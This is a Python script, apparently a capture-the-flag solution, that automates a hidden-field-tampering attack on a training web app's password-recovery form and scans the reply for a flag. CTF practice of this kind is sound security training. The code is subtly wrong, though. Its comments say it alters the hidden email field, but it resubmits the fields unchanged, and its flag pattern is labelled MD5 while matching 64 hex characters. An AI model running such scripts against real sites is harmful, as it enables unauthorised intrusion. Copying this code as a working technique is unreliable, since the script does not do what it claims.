#!/usr/bin/env python3
"""
CTF Flag Harvester
Récupère automatiquement les flags depuis les pages vulnérables
Usage: python3 flag_harvester.py
"""

import requests
from bs4 import BeautifulSoup
import re
import sys

if len(sys.argv) < 2:
    print("Usage: python3 flag_harvester.py <target_ip>")
    print("Ex:    python3 flag_harvester.py 10.0.2.15")
    sys.exit(1)

BASE_URL = f"http://{sys.argv[1]}"

# Couleurs terminal
GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
RESET  = "\033[0m"

def find_flag(text):
    """Cherche un pattern FLAG dans le texte (adapte le pattern si besoin)"""
    patterns = [
        r'THE FLAG IS : [A-F0-9]{64}',  # MD5
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            return match.group(0)
    return None


def exploit_hidden_field(session):
    """
    Vulnérabilité : Hidden Field Tampering
    Page : ?page=recover
    Modifie l'email caché avant soumission
    """
    print(f"\n{CYAN}[*] Exploit: Hidden Field Tampering (?page=recover){RESET}")

    url = f"{BASE_URL}/?page=recover"
    r = session.get(url)
    soup = BeautifulSoup(r.text, "html.parser")

    # Récupère le champ hidden (email du webmaster)
    hidden = soup.find("input", {"type": "hidden"})
    if not hidden:
        print(f"{RED}[-] Aucun champ hidden trouvé{RESET}")
        return None

    print(f"  {YELLOW}Champ hidden trouvé:{RESET} name='{hidden.get('name')}' value='{hidden.get('value')}'")

    # Récupère aussi tous les autres champs du formulaire
    form = soup.find("form")
    payload = {}
    if form:
        for inp in form.find_all("input"):
            name = inp.get("name")
            maxLength = inp.get("maxlength")
            if maxLength:
                value = inp.get("value", "")[:int(maxLength)]
            else:
                value = inp.get("value", "")
            if name:
                payload[name] = value

    print(f"  {YELLOW}Payload envoyé:{RESET} {payload}")

    r2 = session.post(url, data=payload)
    flag = find_flag(r2.text)

    if flag:
        print(f"  {GREEN}[+] FLAG trouvé : {flag}{RESET}")
    else:
        # Cherche dans le HTML pour debug
        soup2 = BeautifulSoup(r2.text, "html.parser")
        body_text = soup2.get_text()
        print(f"{RED}[-] Flag non trouvé. Extrait de la réponse:{RESET}")
        print(body_text[:500])

    return flag


def main():
    session = requests.Session()
    flags = {}

    print(f"{CYAN}{'='*50}")
    print("        CTF Flag Harvester")
    print(f"{'='*50}{RESET}")
    print(f"Target: {BASE_URL}\n")

    # --- Exploit 1 : Hidden Field Tampering ---
    flag = exploit_hidden_field(session)
    if flag:
        flags["Hidden_Field_Tampering"] = flag

    # --- Ajoute tes prochains exploits ici ---
    # flag2 = exploit_sqli(session)
    # flag3 = exploit_xss(session)

    # Résumé final
    print(f"\n{CYAN}{'='*50}")
    print("              RÉSUMÉ")
    print(f"{'='*50}{RESET}")
    if flags:
        for breach, flag in flags.items():
            print(f"  {GREEN}[+] {breach}: {flag}{RESET}")
    else:
        print(f"  {RED}Aucun flag récupéré{RESET}")

    print(f"\n{CYAN}Total : {len(flags)} flag(s) trouvé(s){RESET}\n")


if __name__ == "__main__":
    main()
